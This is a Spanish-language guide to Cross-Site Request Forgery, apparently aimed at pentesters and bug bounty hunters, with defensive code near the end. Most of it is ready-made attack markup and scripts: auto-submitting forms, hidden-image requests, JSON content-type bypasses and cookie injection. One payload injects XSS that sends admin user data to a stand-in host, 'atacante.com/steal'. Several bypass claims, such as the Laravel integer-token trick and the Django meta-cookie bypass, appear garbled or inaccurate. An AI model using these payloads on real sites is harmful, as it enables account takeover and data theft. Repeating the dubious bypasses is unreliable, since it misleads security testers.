# CSRF (Cross-Site Request Forgery) - Guía Completa

El Cross-Site Request Forgery (CSRF) sigue siendo una de las vulnerabilidades más peligrosas en aplicaciones web modernas, especialmente cuando los desarrolladores asumen incorrectamente que las defensas actuales como SameSite cookies han resuelto completamente el problema. En 2024, seguimos viendo vulnerabilidades CSRF críticas en sistemas como Ampache y aplicaciones bancarias, demostrando que los atacantes continúan encontrando formas de bypassear las protecciones modernas.[^5]

## ¿Qué es CSRF?

CSRF es un ataque que obliga a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web donde tiene una sesión activa. El atacante prepara una petición maliciosa y engaña al navegador de la víctima para que la envíe al sitio vulnerable, aprovechando que el navegador envía automáticamente las cookies de sesión.[^6]

### Condiciones para un ataque CSRF exitoso

1. **Acción Relevante:** Una acción en la aplicación que el atacante quiere realizar (cambiar email, transferir fondos, crear usuario admin)
2. **Manejo de Sesión Basado en Cookies:** La aplicación usa cookies para gestionar sesiones
3. **Parámetros Predecibles:** Todos los parámetros son conocidos o predecibles por el atacante, sin tokens CSRF válidos[^6]

## Ejemplos Básicos de Explotación

### CSRF con Petición GET

Las peticiones GET son las más fáciles de explotar porque pueden activarse con simples enlaces o recursos embebidos.[^7]

**Escenario:** Compra de criptomonedas mediante GET:

```
http://victima.com/buy.php?wallet=DIRECCION_ATACANTE&amount=1000&type=BTC
```

**Explotación con enlace malicioso:**

```html
<a href="http://victima.com/buy.php?wallet=DIRECCION_ATACANTE&amount=1000&type=BTC">
  ¡Gana un iPhone gratis!
</a>
```

**Explotación sin interacción (imagen invisible):**

```html
<img src="http://victima.com/buy.php?wallet=DIRECCION_ATACANTE&amount=1000&type=BTC" 
     width="1" height="1" alt="tracking">
```

### CSRF con Petición POST

**Formulario vulnerable en victima.com:**

```html
<form method="post" action="/change_email">
  <label>Nuevo Email:</label>
  <input name="email" value="usuario@victima.com">
  <input type="submit" value="Actualizar Email">
</form>
```

**Página maliciosa del atacante:**

```html
<html>
  <body onload="document.csrf_form.submit()">
    <p>Cargando contenido exclusivo...</p>
    <form name="csrf_form" action="https://victima.com/change_email" method="post">
      <input type="hidden" name="email" value="atacante@atacante.com">
      <input type="submit" value="Obtener Regalo (Falso)">
    </form>
  </body>
</html>
```

## Protecciones CSRF y sus Bypasses Modernos

### Tokens Anti-CSRF y sus Vulnerabilidades

Los tokens CSRF son la defensa más común, pero su implementación frecuentemente tiene fallas:[^9]

**Bypass 1: Token Ausente o No Validado**

```html
<!-- Original con token -->
<input type="hidden" name="csrf_token" value="abc123xyz">
<input type="hidden" name="email" value="nuevo@email.com">

<!-- Bypass: Omitir completamente el token -->
<form action="https://victima.com/change_email" method="post">
  <input type="hidden" name="email" value="atacante@atacante.com">
</form>
```

**Bypass 2: Cambio de Método HTTP**

```javascript
// Original protegido (POST)
POST /admin/delete_user
csrf_token=abc123
user_id=victim

// Bypass via GET si el endpoint lo acepta
GET /admin/delete_user?user_id=victim
```

**Bypass 3: Token No Vinculado a la Sesión**[^10]
Si el token no está vinculado específicamente a la sesión del usuario:

```html
<!-- El atacante obtiene su propio token válido -->
<form action="https://victima.com/sensitive_action" method="post">
  <input type="hidden" name="csrf_token" value="ATACANTE_VALID_TOKEN">
  <input type="hidden" name="action" value="malicious_action">
</form>
```

### Bypasses de SameSite Cookies

Aunque SameSite=Lax es ahora el default en navegadores modernos, existen múltiples técnicas de bypass:[^11]

#### 1. Method Override Bypass[^13]

Los frameworks que soportan HTTP Method Override pueden ser vulnerables:

```html
<!-- Bypass usando _method parameter -->
<form action="https://victima.com/api/delete" method="GET">
  <input type="hidden" name="_method" value="DELETE">
  <input type="hidden" name="resource_id" value="critical_data">
</form>
```

```html
<!-- Bypass usando header override -->
<script>
fetch('https://victima.com/api/sensitive', {
  method: 'GET',
  credentials: 'include',
  headers: {
    'X-HTTP-Method-Override': 'POST'
  }
});
</script>
```

#### 2. SameSite Lax Cookie Refresh Bypass[^11]

Chrome no aplica restricciones SameSite durante los primeros 120 segundos después de establecer una cookie:

```html
<script>
// Forzar refresh de cookie abriendo nueva pestaña
window.onclick = () => {
  window.open('https://victima.com/login/oauth');
  // Esperar un momento y luego ejecutar CSRF
  setTimeout(() => {
    document.getElementById('csrf_form').submit();
  }, 1000);
};
</script>
```

#### 3. Subdomain Cookie Injection[^15]

Si el atacante controla un subdominio:

```html
<!-- En atacante.victima.com -->
<script>
document.cookie = "_csrf=controlled_value; Path=/api; domain=victima.com";
// Ahora puede usar este valor en ataques CSRF
</script>
```

### JSON-Based CSRF Attacks

Los ataques CSRF JSON son especialmente peligrosos en APIs modernas:[^18]

#### Content-Type Bypass Technique

```html
<form action="https://victima.com/api/update_profile" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"atacante@atacante.com","role":"admin"}' value=''>
</form>
```

**Resultado:** El servidor recibe:

```json
{"email":"atacante@atacante.com","role":"admin"}=
```

#### Advanced JSON CSRF con Fetch API

```html
<script>
// Bypass para APIs que requieren application/json
fetch('https://victima.com/api/transfer_funds', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'text/plain'  // Evita preflight
  },
  body: JSON.stringify({
    amount: 10000,
    destination: "atacante_account"
  })
});
</script>
```

## Técnicas Avanzadas de Explotación

### Self-XSS a XSS Real mediante CSRF

**Escenario:** Self-XSS en campo de perfil + endpoint vulnerable a CSRF

**Payload CSRF que inyecta XSS:**

```html
<html>
  <body onload="document.csrf_xss_form.submit()">
    <form name="csrf_xss_form" action="https://victima.com/update_profile" method="post">
      <input type="hidden" name="username" value="Usuario Normal">
      <input type="hidden" name="bio" value="<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://atacante.com/steal',{method:'POST',body:JSON.stringify(d)}));</script>">
    </form>
  </body>
</html>
```

**Flujo del ataque:**

1. Víctima visita página del atacante
2. CSRF actualiza perfil con payload XSS
3. Cuando víctima ve su perfil, ejecuta el XSS
4. Script roba datos administrativos

### CSRF in OAuth Flows[^19]

OAuth mal implementado es vulnerable a CSRF:

```html
<!-- Forzar autorización no deseada -->
<iframe src="https://oauth-provider.com/authorize?client_id=APP_ID&redirect_uri=https://victima.com/callback&scope=admin&state=PREDICTABLE"></iframe>
```

### Double Submit Cookie Vulnerabilities[^15]

Cuando la validación solo verifica que el token de cookie coincida con el parámetro:

```javascript
// Si el atacante puede inyectar cookies
document.cookie = "csrf_token=controlled_value; domain=victima.com";

// Entonces puede usar ese valor en el ataque
fetch('/api/sensitive', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-CSRF-Token': 'controlled_value'
  },
  body: 'malicious=data'
});
```

## Vulnerabilidades Reales Documentadas

### CVE-2024-56924: Internet Banking System[^3]

CSRF que permite ejecución de JavaScript arbitrario en página de administración, llevando a cambios no autorizados de configuración de cuenta.

### CVE-2024-51489: Ampache Messaging System[^1]

Validación inadecuada de tokens CSRF permite a atacantes enviar mensajes a cualquier usuario, incluyendo administradores.

### CVE-2024-47828: Ampache Object Deletion[^4]

CSRF que permite eliminar objetos (playlists, smartlists) de otros usuarios mediante scripts maliciosos.

## Técnicas Modernas de Bypass 2024

### 1. Mobile Browser SameSite Bypass[^22]

Android browsers tenían una vulnerabilidad que permitía bypass via intent redirection:

```html
<script>
if (navigator.userAgent.includes('Android')) {
  location = 'intent://victima.com/sensitive_action#Intent;scheme=https;package=com.android.chrome;end';
}
</script>
```

### 2. Laravel CSRF Bypass[^8]

85% de tokens CSRF en Laravel comenzaban con letra o cero, permitiendo bypass:

```javascript
fetch('/api/delete', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    action: "delete",
    _token: 0  // Integer bypass
  })
});
```

### 3. Framework-Specific Bypasses

**Django CSRF Bypass:**

```html
<meta http-equiv="set-cookie" content="csrftoken=controlled; domain=victima.com">
```

**Rails Authenticity Token Bypass:**

```html
<!-- Si el token no se valida en GET -->
<img src="https://victima.com/admin/delete_user/123?authenticity_token=">
```

## Metodología de Testing Avanzada

### 1. Identificación de Superficies de Ataque

```bash
# Buscar endpoints que cambien estado
grep -r "POST\|PUT\|DELETE\|PATCH" source_code/
# Identificar formularios sin tokens
grep -r "<form" templates/ | grep -v "csrf"
# Buscar APIs JSON
grep -r "application/json" config/
```

### 2. Análisis de Protecciones

**Verificar SameSite Cookies:**

```javascript
// En DevTools Console
document.cookie.split(';').forEach(c => {
  if (c.includes('SameSite')) console.log(c);
});
```

**Testing de Tokens CSRF:**

```bash
# Token presente
curl -X POST https://victima.com/api/action -d "csrf_token=valid&action=test"

# Token omitido
curl -X POST https://victima.com/api/action -d "action=test"

# Token inválido
curl -X POST https://victima.com/api/action -d "csrf_token=invalid&action=test"
```

### 3. Construcción de PoCs

**Template Básico:**

```html
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <p>Este PoC demuestra CSRF en: TARGET_URL</p>
  
  <form action="TARGET_URL" method="POST" id="csrf_form">
    <!-- Campos maliciosos aquí -->
    <input type="hidden" name="field1" value="malicious_value1">
    <input type="hidden" name="field2" value="malicious_value2">
  </form>
  
  <script>
    // Auto-submit después de 3 segundos
    setTimeout(() => {
      document.getElementById('csrf_form').submit();
    }, 3000);
  </script>
</body>
</html>
```

## Defensas Modernas y Mejores Prácticas

### 1. Implementación Correcta de SameSite

```http
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
```

- **Strict:** Máxima protección, no se envía en ninguna request cross-site
- **Lax:** Balanceado, permite top-level navigation
- **None:** Solo con Secure flag

### 2. Tokens CSRF Robustos[^23]

```javascript
// Generación segura de tokens
const crypto = require('crypto');

function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Validación por sesión
function validateCSRF(req, res, next) {
  const sessionToken = req.session.csrfToken;
  const requestToken = req.body._csrf || req.headers['x-csrf-token'];
  
  if (!sessionToken || sessionToken !== requestToken) {
    return res.status(403).json({error: 'Invalid CSRF token'});
  }
  next();
}
```

### 3. Double Submit Cookie Signed[^20]

```javascript
const hmac = crypto.createHmac('sha256', secret_key);
hmac.update(token + session_id);
const signedToken = hmac.digest('hex');
```

### 4. Validación de Headers

```javascript
// Verificar Origin/Referer
function validateOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://victima.com'];
  
  if (!allowedOrigins.includes(origin)) {
    return res.status(403).json({error: 'Invalid origin'});
  }
  next();
}
```

### 5. Framework-Specific Protections

**React CSRF Protection:**[^24]

```jsx
// Custom hook para CSRF
function useCSRF() {
  const [token, setToken] = useState('');
  
  useEffect(() => {
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(data => setToken(data.token));
  }, []);
  
  return token;
}
```

**Laravel CSRF (Modern):**[^25]

```php
// En Kernel.php
protected $middlewareGroups = [
    'web' => [
        \App\Http\Middleware\VerifyCsrfToken::class,
    ],
];
```

## Consideraciones para Bug Bounty 2024

### Targets de Alto Valor

1. **APIs internas** expuestas sin protección CSRF
2. **Aplicaciones móviles** con web components
3. **Microservicios** con autenticación compartida
4. **Sistemas OAuth** mal configurados
5. **Applications financieras** con validaciones client-side

### Técnicas de Reconnaissance

```bash
# Buscar endpoints sin protección
subfinder -d target.com | httpx | nuclei -t csrf/

# Identificar frameworks vulnerables
whatweb target.com | grep -E "Laravel|Django|Rails"

# Análizar cookies
curl -I https://target.com | grep -i "set-cookie"
```

### Automation Scripts

```python
import requests
from bs4 import BeautifulSoup

def test_csrf_bypass(url, data):
    # Test 1: Sin token
    resp1 = requests.post(url, data=data)
  
    # Test 2: Token vacío  
    data['csrf_token'] = ''
    resp2 = requests.post(url, data=data)
  
    # Test 3: Cambio a GET
    resp3 = requests.get(url, params=data)
  
    return [resp1.status_code, resp2.status_code, resp3.status_code]
```

## Reporting Efectivo

### Template de Reporte

```markdown
## CSRF Vulnerability in Email Change Function

**Severity:** High
**CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Summary
The email change functionality lacks CSRF protection, allowing attackers 
to change any authenticated user's email address without their consent.

### Proof of Concept
1. User logs into https://victima.com
2. User visits attacker page: https://atacante.com/csrf.html
3. Page auto-submits form changing user's email

### Impact
- Account takeover via password reset
- Unauthorized access to sensitive data
- Potential privilege escalation

### Remediation
- Implement CSRF tokens for all state-changing operations
- Configure SameSite=Strict on session cookies
- Validate Origin/Referer headers
```

El CSRF sigue siendo un vector de ataque crítico en 2024 porque los desarrolladores frecuentemente implementan defensas incorrectas o incompletas. Los atacantes modernos combinan técnicas clásicas con nuevos métodos de bypass específicos para frameworks actuales, APIs JSON, y aplicaciones móviles.[^5]

La clave para una defensa efectiva está en implementar múltiples capas de protección: tokens CSRF robustos, cookies SameSite configuradas correctamente, validación de headers, y testing continuo. Para los bug bounty hunters, el enfoque debe estar en identificar implementaciones incorrectas de estas defensas y encontrar endpoints olvidados que no tengan protección CSRF.
<span style="display:none">[^33][^41][^49][^53]</span>

<div style="text-align: center">CSRF (Cross-Site Request Forgery) - Guía Completa</div>

[^1]: https://www.invicti.com/web-application-vulnerabilities/ampache-cross-site-request-forgery-csrf-vulnerability-cve-2024-51489
    
[^2]: https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-9.0
    
[^3]: https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2024-56924
    
[^4]: https://www.invicti.com/web-application-vulnerabilities/ampache-cross-site-request-forgery-csrf-vulnerability-cve-2024-47828
    
[^5]: https://infosecwriteups.com/csrf-in-2025-solved-but-still-bypassable-942ca382ab77
    
[^6]: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF
    
[^7]: https://brightsec.com/blog/csrf-example/
    
[^8]: https://www.cobalt.io/blog/csrf-bypasses
    
[^9]: https://www.intigriti.com/researchers/blog/hacking-tools/csrf-a-complete-guide-to-exploiting-advanced-csrf-vulnerabilities
    
[^10]: https://www.linkedin.com/pulse/bypassing-unpredictable-csrf-tokens-muvhango-magatshavha-jl7lf
    
[^11]: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
    
[^12]: https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/
    
[^13]: https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/
    
[^14]: https://osintteam.blog/web-security-academy-csrf-samesite-lax-bypass-via-cookie-refresh-775f4f6efdc2
    
[^15]: https://owasp.org/www-chapter-london/assets/slides/David_Johansson-Double_Defeat_of_Double-Submit_Cookie.pdf
    
[^16]: https://sallam.gitbook.io/sec-88/write-ups/exploiting-json-based-csrf-the-hidden-threat-in-profile-management
    
[^17]: https://bugbase.ai/blog/how-to-bypass-csrf-protection
    
[^18]: https://stackoverflow.com/questions/11008469/are-json-web-services-vulnerable-to-csrf-attacks
    
[^19]: https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/
    
[^20]: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
    
[^21]: https://outpost24.com/blog/csrf-attacks-simplified-guide/
    
[^22]: https://www.certuscyber.com/insights/bypass-samesite-cookie/
    
[^23]: https://zuplo.com/learning-center/preventing-cross-site-request-forgery-in-apis
    
[^24]: https://www.stackhawk.com/blog/react-csrf-protection-guide-examples-and-how-to-enable-it/
    
[^25]: https://moldstud.com/articles/p-comparing-csrf-protection-methods-lumen-vs-other-frameworks
    
[^26]: https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2024-52402
    
[^27]: https://portswigger.net/web-security/csrf
    
[^28]: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
    
[^29]: http://scielo.sld.cu/scielo.php?script=sci_abstract\&pid=S2306-24952024000700133\&lng=en\&nrm=iso
    
[^30]: https://learn.snyk.io/lesson/csrf-attack/
    
[^31]: https://stackoverflow.com/questions/79368322/how-to-bypass-samesite-cookie-restriction-in-microsoft-edge-during-local-develop
    
[^32]: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-csrf-y4ZUz5Rj
    
[^33]: https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/
    
[^34]: https://www.youtube.com/watch?v=ucHEU1Z9DhU
    
[^35]: https://nvd.nist.gov/vuln/detail/CVE-2024-51484
    
[^36]: https://en.wikipedia.org/wiki/Cross-site_request_forgery
    
[^37]: https://vulnapi.cerberauth.com/docs/vulnerabilities/security-misconfiguration/http-method-allow-override
    
[^38]: https://www.linkedin.com/pulse/how-double-submit-cookie-prevent-csrf-viral-parmar-qzyqc
    
[^39]: https://www.youtube.com/watch?v=Jv-LXLID3VA
    
[^40]: https://www.webasha.com/blog/how-does-csrf-lead-to-account-takeover-real-world-example-and-exploit-chain-explained
    
[^41]: https://brightsec.com/blog/csrf-mitigation/
    
[^42]: https://github.com/obiba/opal/security/advisories/GHSA-27vw-29rq-c358
    
[^43]: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
    
[^44]: https://www.invicti.com/blog/web-security/protecting-website-using-anti-csrf-token/
    
[^45]: https://stackoverflow.com/questions/73031478/is-the-double-submit-cookie-pattern-really-safe
    
[^46]: https://www.wiz.io/academy/cross-site-request-forgery-csrf
    
[^47]: https://www.acceis.fr/csrf-get-samesite-concrete-attack/
    
[^48]: https://www.bitsight.com/blog/web-application-security-devops-anti-csrf-and-cookie-samesite-options
    
[^49]: https://heycoach.in/blog/cross-site-request-forgery-csrf-prevention-techniques/
    
[^50]: https://www.sciencedirect.com/science/article/pii/S2667295221000258
    
[^51]: https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2024-22424
    
[^52]: https://infosecwriteups.com/how-i-exploited-a-hidden-csrf-vulnerability-and-how-you-can-prevent-it-d089ad23887d
    
[^53]: https://www.openwall.com/lists/oss-security/2024/11/16/2
